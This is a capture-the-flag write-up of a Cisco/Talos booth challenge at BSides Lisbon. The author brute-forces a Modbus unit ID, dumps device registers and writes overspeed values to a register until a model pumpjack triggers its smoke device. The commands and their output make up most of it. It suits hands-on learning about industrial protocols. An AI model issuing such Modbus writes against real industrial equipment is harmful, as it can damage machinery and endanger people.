[BSides Lisbon](https://bsideslisbon.org/) is the biggest security dedicated event in Portugal, with two days of talks, workshops, a CTF competition, and lots more. During BSides, some _sidequests_ ranging from raffles to challenges appear that can give you prizes*!* This is a write-up of one of those challenges by Cisco/Talos.

## The Challenge

![Make it Smoke!](/images/bsideslx19/header.png)

In the booth of Cisco/Talos, we were presented with the following scenario (as it can be seen in the picture):

1. An access point (AP) named `security` with the password `cisco12345`.
2. A 3d-printed pumpjack[^1].
3. Some controlling system based on Arduino.
4. The objective was to make it smoke somehow.

## Preliminaries

First thing first, connect to the network and do a quick network and port scan. Since it was an AP for everyone that wanted to do the challenge, several IP's showed up, but only one interesting, the `10.10.10.1` with the port `502` open.

As per Siemens documentation: _By default, the protocol uses Port `502` as local port in the Modbus server_[^2]. Thus we are probably faced with something that speaks _Modbus_ protocol.

With a little of search, you can find a lot of _Modbus_ protocol clients in the wild, as well as some _offensive_ toolkits.

## Making it smoke!

Using the [smod-1 by theralfbrown](https://github.com/theralfbrown/smod-1) toolkit, I was able to connect to the Modbus system and interact with it.

{% highlight bash %}
$ python smod.py
SMOD > use modbus/scanner/uid
SMOD modbus(uid) > set RHOST 10.10.10.1
SMOD modbus(uid) > exploit
[+] Module Brute Force UID Start
[+] Start Brute Force UID on : 10.10.10.1
[+] UID on 10.10.10.1 is : 10
{% endhighlight %}

Now I did know the UID of the Modbus, however even after exploring the DoS capabilities and _all_ the reader modules I was not getting anywhere close to make it smoke.

So, after exploring a little more one Github, I found out this really nice [modbus-cli by tallakt](https://github.com/tallakt/modbus-cli).

Even if it was not implemented with an _offensive_ mindset like the previous tool, it allowed us to read, write and **dump** the memory of a _Modbus_ device. Using it, we were able to read random parts of the memory, _e.g._, reading five words from the device starting from address `%MW100` (which corresponds to address `400101`).

{% highlight bash %}
$ modbus read 10.10.10.1 %MW100 5
%MW100 0
%MW101 0
%MW102 0
%MW103 0
%MW104 0
{% endhighlight %}

After trying to read random places of the memory using this tool and finding nothing but zero values, and decided to just _dump_ everything into a file (the operation took around 20 seconds).

{% highlight bash %}
$ modbus read --output mybackup.yml 10.10.10.1 400001 1000
{% endhighlight %}

After dumping all the memory into a file, looking into the file:

{% highlight bash %}
$ cat mybackup.yml

---

:host: 10.10.10.1
:port: 502
:slave: 1
:offset: '400001'
:data:

- 0
- 0
- 0
- 0
- 0
- 0
- 5000
- 0
  -- show more --
  {% endhighlight %}

The file keeps going on, with a lot of zero's and a lot of random values. I guess that those random values were the result of all the participants trying to _pwn_ it.

However, that seventh value caught my attention because it was a single round number. Maybe that was the speed of the rotation mechanism of the pumpjack, _maybe_.

Checking if the dump was correct, with the same tool we could read that specific part of the memory:

{% highlight bash %}
$ modbus read 10.10.10.1 400001 7
400001 0
400002 0
400003 0
400004 0
400005 0
400006 0
400007 8000
{% endhighlight %}

And yep, the value was still there, but a bit higher (and we could observe the pumpjack rotating more quickly).

So the next step was to try to write some higher value there:

{% highlight bash %}
$ modbus write 10.10.10.1 400007 10000
{% endhighlight %}

And then, _higher_:

{% highlight bash %}
$ modbus write 10.10.10.1 400007 18000
{% endhighlight %}

And this was it, the increase in the rotation speed of the pumpjack triggered the smoke device that was connected to the Arduino!

This was my first time playing around with _Modbus_, and there is still a lot that I didn't touch nor understood. Nonetheless, it was a nice kickstart.

Props to Cisco and Talos for coming up with the challenge and for the coffee mug and the [_snort_](https://www.snort.org/). And _pwning_ IoT is the best kind of _pwn_.
